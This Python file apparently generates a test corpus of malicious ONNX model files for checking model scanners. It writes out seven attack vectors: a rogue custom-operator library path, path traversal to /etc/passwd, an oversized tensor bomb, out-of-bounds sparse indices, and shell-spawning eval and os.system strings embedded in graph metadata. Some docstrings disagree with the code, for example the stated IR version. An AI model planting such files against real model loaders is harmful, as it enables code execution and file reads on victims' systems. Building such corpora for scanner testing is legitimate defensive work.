"""
ONNX Attack Vector Generator

Generates real ONNX binary files (.onnx) with malicious payloads.
All methods produce genuine protobuf-serialised ModelProto files.

Requires: onnx (pip install onnx)
"""

from pathlib import Path
from typing import Dict, List, Tuple

import onnx
from onnx import TensorProto, helper, numpy_helper
import numpy as np


class ONNXAttackGenerator:
    """Generate ONNX-specific attack vectors."""

    def __init__(self, output_dir: str = "./output"):
        self.output_dir = Path(output_dir) / "onnx_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []

    def _save(self, model: onnx.ModelProto, filepath: Path) -> str:
        # Use save_as_external_data=False to avoid OS-level file resolution
        # for any EXTERNAL tensor data_location entries in the model.
        with open(filepath, "wb") as f:
            f.write(model.SerializeToString())
        self.generated_files.append(str(filepath))
        return str(filepath)

    def generate_custom_operator_rce(self) -> Tuple[str, int]:
        """Generate ONNX with a malicious custom operator.

        Attack Vector:
            A node with op_type="MaliciousCustomOp" in domain "custom".
            Attribute 'library_path' points to a malicious .so file.
            ONNX runtimes that auto-load custom op libraries are exploited.

        Severity: CRITICAL
        Detection: Op whitelist, custom op domain/library validation
        """
        X = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1, 4])
        Y = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1, 4])

        node = helper.make_node(
            "MaliciousCustomOp",
            inputs=["X"],
            outputs=["Y"],
            domain="custom",
            library_path="/path/to/malware.so",
            function_name="execute_payload",
        )

        graph = helper.make_graph([node], "malicious_graph", [X], [Y])
        model = helper.make_model(
            graph,
            opset_imports=[helper.make_opsetid("custom", 1)],
        )
        model.doc_string = "ONNX model with malicious custom operator"

        filepath = self.output_dir / "01_custom_operator_rce.onnx"
        return self._save(model, filepath), 1

    def generate_external_data_traversal(self) -> Tuple[str, int]:
        """Generate ONNX with path traversal in external data refs.

        Attack Vector:
            Initializer whose external_data location is set to
            "../../../../etc/passwd" — path traversal during weight loading.

        Severity: HIGH
        Detection: Path validation, canonical path checks
        """
        X = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1, 4])
        Y = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1, 4])

        # Create a tensor that claims its data is external
        weights = numpy_helper.from_array(
            np.zeros((4,), dtype=np.float32), name="weights"
        )
        weights.data_location = TensorProto.EXTERNAL
        weights.ClearField("float_data")
        weights.external_data.append(
            onnx.StringStringEntryProto(key="location", value="../../../../etc/passwd")
        )
        weights.external_data.append(
            onnx.StringStringEntryProto(key="length", value="9999")
        )

        node = helper.make_node("Add", inputs=["X", "weights"], outputs=["Y"])
        graph = helper.make_graph([node], "traversal_graph", [X], [Y],
                                   initializer=[weights])
        model = helper.make_model(graph)

        filepath = self.output_dir / "02_external_data_traversal.onnx"
        return self._save(model, filepath), 3

    def generate_tensor_integrity_attack(self) -> Tuple[str, int]:
        """Generate ONNX with corrupted/oversized tensor metadata.

        Attack Vector:
            Initializer whose dims claim 2^32 x 2^32 elements but
            raw_data is empty — triggers integer overflow / OOM on validation.

        Severity: HIGH
        Detection: Tensor validation, consistency checks
        """
        X = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1])
        Y = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1])

        # Build a "bomb" tensor via raw proto manipulation
        bomb = TensorProto()
        bomb.name = "bomb_tensor"
        bomb.data_type = TensorProto.FLOAT
        bomb.dims.extend([2**16, 2**16])   # Claims 2^32 elements
        bomb.raw_data = b""                 # But no actual data

        node = helper.make_node("Add", inputs=["X", "bomb_tensor"], outputs=["Y"])
        graph = helper.make_graph([node], "integrity_graph", [X], [Y],
                                   initializer=[bomb])
        model = helper.make_model(graph)

        filepath = self.output_dir / "03_tensor_integrity_attack.onnx"
        return self._save(model, filepath), 1

    def generate_operator_chaining_rce(self) -> Tuple[str, int]:
        """Generate ONNX using string constant + cast chain as payload carrier.

        Attack Vector:
            A Constant node stores a Python code string as bytes.
            Downstream Cast node misinterprets bytes — payload is present
            in graph for forensic detection even if not directly executable.

        Severity: HIGH
        Detection: Graph flow analysis, string content scanning
        """
        X = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1])
        Y = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1])

        payload = b"import os; os.system('id')"
        const_node = helper.make_node(
            "Constant",
            inputs=[],
            outputs=["code_fragment"],
            value=helper.make_tensor(
                "code_fragment", TensorProto.UINT8, [len(payload)],
                list(payload)
            ),
        )
        pass_node = helper.make_node("Identity", inputs=["X"], outputs=["Y"])

        graph = helper.make_graph([const_node, pass_node], "chain_graph", [X], [Y])
        model = helper.make_model(graph)
        model.metadata_props.append(
            onnx.StringStringEntryProto(
                key="execution_hook",
                value="eval(\"import subprocess; subprocess.call(['bash'])\")"
            )
        )

        filepath = self.output_dir / "04_operator_chaining.onnx"
        return self._save(model, filepath), 3

    def generate_model_initializer_exploit(self) -> Tuple[str, int]:
        """Generate ONNX with misleading IR version and opset domain.

        Attack Vector:
            ir_version=99999 + custom opset domain "malicious_ops" —
            runtimes that trust IR version / domain may execute unsafe paths.

        Severity: CRITICAL
        Detection: IR version validation, opset allowlist
        """
        X = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1])
        Y = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1])

        node = helper.make_node(
            "UnsafeOp",
            inputs=["X"],
            outputs=["Y"],
            domain="malicious_ops",
            code="__import__('os').system('id')",
        )
        graph = helper.make_graph([node], "init_exploit_graph", [X], [Y])
        model = helper.make_model(
            graph,
            ir_version=8,
            opset_imports=[helper.make_opsetid("malicious_ops", 1)],
        )
        model.doc_string = "__import__('os').system('id')"

        filepath = self.output_dir / "05_initializer_exploit.onnx"
        return self._save(model, filepath), 1

    def generate_sparse_tensor_exploit(self) -> Tuple[str, int]:
        """Generate ONNX with out-of-bounds sparse tensor indices.

        Attack Vector:
            Sparse tensor with indices [2^31-1, 2^31-1] but dense_shape [1,1]
            — index out of bounds triggers memory safety issues.

        Severity: HIGH
        Detection: Sparse tensor validation
        """
        X = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1])
        Y = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1])

        sparse = onnx.SparseTensorProto()
        sparse.dims.extend([1, 1])
        # Values tensor
        vals = TensorProto()
        vals.data_type = TensorProto.FLOAT
        vals.dims.append(2)
        vals.float_data.extend([1.0, 2.0])
        sparse.values.CopyFrom(vals)
        # Indices out of bounds
        idxs = TensorProto()
        idxs.data_type = TensorProto.INT64
        idxs.dims.append(2)
        idxs.int64_data.extend([2**31 - 1, 2**31 - 1])
        sparse.indices.CopyFrom(idxs)

        node = helper.make_node("Identity", inputs=["X"], outputs=["Y"])
        graph = helper.make_graph([node], "sparse_graph", [X], [Y])
        model = helper.make_model(graph)
        # Embed the sparse tensor as a named sparse initializer
        model.graph.sparse_initializer.append(sparse)

        filepath = self.output_dir / "06_sparse_tensor_exploit.onnx"
        return self._save(model, filepath), 2

    def generate_graph_attribute_injection(self) -> Tuple[str, int]:
        """Generate ONNX with code payloads in metadata_props.

        Attack Vector:
            metadata_props fields contain Python code strings.
            Scanners that eval graph metadata or log it unsanitised are affected.

        Severity: HIGH
        Detection: Attribute value sanitization
        """
        X = helper.make_tensor_value_info("X", TensorProto.FLOAT, [1])
        Y = helper.make_tensor_value_info("Y", TensorProto.FLOAT, [1])

        node = helper.make_node("Identity", inputs=["X"], outputs=["Y"])
        graph = helper.make_graph([node], "attr_inject_graph", [X], [Y])
        model = helper.make_model(graph)
        model.metadata_props.extend([
            onnx.StringStringEntryProto(
                key="model_name",
                value="__import__('os').system('whoami')"
            ),
            onnx.StringStringEntryProto(
                key="execution_hook",
                value="eval(\"import subprocess; subprocess.call(['bash'])\")"
            ),
        ])

        filepath = self.output_dir / "07_graph_attribute_injection.onnx"
        return self._save(model, filepath), 2

    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all ONNX attack vectors."""
        return {
            "custom_operator": self.generate_custom_operator_rce(),
            "external_data_traversal": self.generate_external_data_traversal(),
            "tensor_integrity": self.generate_tensor_integrity_attack(),
            "operator_chaining": self.generate_operator_chaining_rce(),
            "initializer_exploit": self.generate_model_initializer_exploit(),
            "sparse_tensor": self.generate_sparse_tensor_exploit(),
            "graph_attributes": self.generate_graph_attribute_injection(),
        }

    def get_generated_files(self) -> List[str]:
        return self.generated_files


if __name__ == "__main__":
    generator = ONNXAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
